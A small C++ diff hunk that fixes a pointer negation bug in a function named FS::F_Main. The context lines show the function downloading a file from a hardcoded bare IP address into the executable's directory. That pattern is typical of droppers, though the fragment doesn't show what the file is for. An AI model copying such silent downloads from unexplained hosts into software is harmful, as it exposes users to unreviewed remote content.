@@ -22,7 +22,7 @@ bool FS::F_WriteFile(std::string directory)
 void FS::F_Main(std::string* PATH, bool* var)
 {
     //return;
-    *var = !var;
+    *var = !*var;
     srand(time(NULL));
     std::string url = "http://16.170.254.129/paska.jpg";
     std::string dst = GetExePath()+"\\paska.jpg";
